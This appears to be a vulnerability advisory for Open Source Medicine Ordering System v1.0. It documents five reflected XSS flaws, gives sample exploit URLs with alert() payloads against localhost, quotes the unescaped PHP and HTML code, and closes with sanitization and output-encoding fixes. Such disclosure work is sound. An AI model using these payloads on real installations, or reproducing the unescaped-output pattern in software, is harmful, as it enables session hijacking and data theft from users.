# Open Source Medicine Ordering System v1.0 was discovered to contain multiple XSS vulnerabilities that can be exploited by an unauthorized attacker.

## Introduction

Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. It allows attackers to inject malicious scripts into web pages viewed by other users. In the context of your PHP application, XSS vulnerabilities are triggered via a parameter obtained through the GET method in the URL. These vulnerabilities can be exploited without requiring the user to be authenticated.

## Impact

The impact of an XSS vulnerability can be severe and far-reaching, including:

Session Hijacking: Attackers can steal session cookies, enabling them to impersonate legitimate users.
Defacement: Malicious scripts can alter the appearance and content of the web pages.
Phishing: Users can be redirected to malicious websites designed to steal sensitive information.
Data Theft: Attackers can capture and exfiltrate sensitive information from the application.
Malware Distribution: Malicious scripts can be used to deliver malware to users' devices.

**XSS 1**

Sample Exploit Link: 

http://localhost/omos/admin/reports/index.php?date=%22%20onfocus=alert(%27enforsec%27)%20autofocus%20a=%22a

Vulnerable Page: /admin/reports/index.php

Vulnerable PHP Code:
```
<?php
$date = isset($_GET['date']) ? $_GET['date'] : date("Y-m-d");
?>
```
Vulnerable HTML Code:
```
<input type="date" class="form-control form-control-sm rounded-0" name="date" id="date" value="<?= $date ?>" required="required">
```
**XSS 2**

Sample Exploit Link 1: 

http://localhost/omos/report/list.php?search=%3Cscript%3Ealert(%27enforsec%27)%3C/script%3E

Sample Exploit Link 2: 

https://localhost/?p=report/list&search=%3Cscript%3Ealert(%27enforsec%27)%3C/script%3E

Vulnerable Page: /report/list.php

Vulnerable Code:

```
        <div class="content py-5 px-3 bg-gradient-danger">
            <h2>Search Result against '<?= $_GET['search'] ?>'</h2>
        </div>
```

**XSS 3**

Sample Exploit Link: 

http://localhost/omos/admin/inventory/manage_stock.php?pid=%27%3E%3Cscript%3Ealert(%27enforsec%27)%3C/script%3E

Vulnerable Page: /admin/inventory/manage_stock.php

Vulnerable Code:

```
<input type="hidden" name="product_id" value='<?= isset($product_id) ? $product_id : (isset($_GET['pid']) ? $_GET['pid'] : '') ?>'>
```

**XSS 4**

Sample Exploit Link: 

https://localhost/omos/admin/?page=user%2flist45755'%3balert(1)%2f%2f853

**XSS 5**

Sample Exploit Link: 

https://localhost/admin/?page=orders&status=257042'%3balert(1)%2f%2f704

## Solution

To mitigate XSS vulnerabilities in PHP applications, it is crucial to properly sanitize and validate all user inputs, especially those coming from the URL via the GET method. The following steps outline a detailed approach to securing your application:

**Input Sanitization:**

Use PHP functions to sanitize inputs, ensuring that any HTML tags or special characters are neutralized. The "htmlspecialchars" function converts special characters to HTML entities, preventing them from being interpreted as HTML or JavaScript. Sample sanitization code is provided below.

```
// Sanitize GET parameter
$param = htmlspecialchars($_GET['param'], ENT_QUOTES, 'UTF-8');
```

**Input Validation:**

Validate the input to ensure it meets expected criteria (e.g., specific format, length). Regular expressions can be used for pattern matching. Sample code is provided below.

```
// Example validation for an email parameter
if (filter_var($param, FILTER_VALIDATE_EMAIL) === false) {
    // Handle invalid input
    exit('Invalid input');
}
```

**Output Encoding:**

Ensure that all data output to the browser is properly encoded. This includes data coming from the database or other sources. Sample code is provided below.

```
// Encode output before displaying it
echo htmlspecialchars($param, ENT_QUOTES, 'UTF-8');
```
